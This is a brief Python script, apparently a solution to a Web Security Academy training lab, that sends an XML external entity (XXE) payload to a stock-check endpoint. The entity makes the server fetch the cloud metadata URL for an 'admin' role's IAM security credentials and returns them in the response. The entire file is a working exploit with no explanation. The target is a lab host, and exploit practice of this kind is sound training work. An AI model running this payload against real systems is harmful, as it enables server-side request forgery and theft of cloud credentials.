import requests

url = "https://0abb00740473052a81b345da00f20061.web-security-academy.net/product/stock"

xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>'''

response = requests.post(url, data=xml)

print(response.text)